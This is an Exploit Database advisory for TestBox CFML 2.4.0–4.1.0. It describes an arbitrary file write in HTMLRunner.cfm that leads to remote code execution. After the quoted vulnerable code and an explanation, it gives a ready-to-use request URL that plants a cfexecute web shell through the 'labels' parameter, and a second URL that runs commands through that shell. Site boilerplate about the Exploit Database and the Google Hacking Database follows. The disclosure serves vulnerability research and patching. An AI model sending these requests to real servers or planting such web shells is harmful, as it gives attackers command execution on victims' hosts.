# Title: TestBox CFML Test Framework 4.1.0 - Arbitrary File Write and Remote Code Execution
# Author: Darren King
# Date: 2020-07-23
# Vendor Homepage: https://www.ortussolutions.com/products/testbox
# Software Link: https://www.ortussolutions.com/parent/download/testbox?version=3.1.0
# Version : 2.4.0 through to 4.1.0

About TestBox
------------------------
TestBox is an open source testing framework for ColdFusion (CFML). It is written and maintained by Ortus Solutions, and can be
downloaded/installed as a stand-alone package as well as being distributed as part of Ortus' ColdBox CFML MVC framework (https://www.coldbox.org/).

TestBox is normally deployed in directories "/testbox" (or "/test") under the root of the corresponding ColdFusion/ColdBox application,
and allows users to run CFML unit tests and to generate reports.

https://www.ortussolutions.com/products/testbox
https://github.com/Ortus-Solutions/testbox

As per the vendor, TestBox is meant for development & testing purposes only and should not be deployed to production environments.

Command Injection & RCE
------------------------
The file testbox/system/runners/HTMLRunner.cfm is vulnerable to command injection and can be exploited to obtain remote code execution on the remote host.
The block below shows the vulnerable code:

HTMLRunner.cfm, lines 51-73:
// Write TEST.properties in report destination path.
if( url.propertiesSummary ){
	testResult = testbox.getResult();
	errors = testResult.getTotalFail() + testResult.getTotalError();
	savecontent variable="propertiesReport"{
		writeOutput( ( errors ? "test.failed=true" : "test.passed=true" ) & chr( 10 ) );
		writeOutput( "test.labels=#arrayToList( testResult.getLabels() )#
		test.bundles=#URL.bundles#
		test.directory=#url.directory#
		total.bundles=#testResult.getTotalBundles()#
		total.suites=#testResult.getTotalSuites()#
		total.specs=#testResult.getTotalSpecs()#
		total.pass=#testResult.getTotalPass()#
		total.fail=#testResult.getTotalFail()#
		total.error=#testResult.getTotalError()#
		total.skipped=#testResult.getTotalSkipped()#" );
	}

	//ACF Compatibility - check for and expand to absolute path
	if( !directoryExists( url.reportpath ) ) url.reportpath = expandPath( url.reportpath );

	fileWrite( url.reportpath & "/" & url.propertiesFilename, propertiesReport );
}

If the "propertiesSummary" query string parameter is specified, the CFM page will write a properties file to the specified path with a summary of the tests performed.
The reportpath and propertiesFilename values are both supplied as query string parameters and are unvalidated, meaning that the user can supply an arbitrary filename and have the application output
a CFM file (i.e. propertiesFilename=evil.cfm) within the path of the application.
The user can also specify the "labels" to apply to the test (via the "labels" query string parameter), which are included in the written properties file. Again, these labels are unvalidated and
not sanitized, allowing arbitrary CFML tags and script to be passed to the code. When the properties are output to a CFM file (as per the propertiesFilename parameter), the written CFM
can then be accessed via the browser and any corresponding CFML tags will be executed by the CFML server.
(Note that Adobe ColdFusion often runs as the System user on Windows, which means it might be possible to achieve remote code execution as System in these circumstances.)

Sample URL to write local CFM file:
http://<HOST>/testbox/system/runners/HTMLRunner.cfm?propertiesSummary=true&reportpath=../runners&propertiesFilename=exec.cfm&labels=<pre><cfexecute name="%23url.cmd%23" arguments="%23url.args%23" timeout="5"></cfexecute></pre>

Sample URL to confirm:
http://<HOST>/testbox/system/runners/exec.cfm?cmd=whoami&args=/all

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
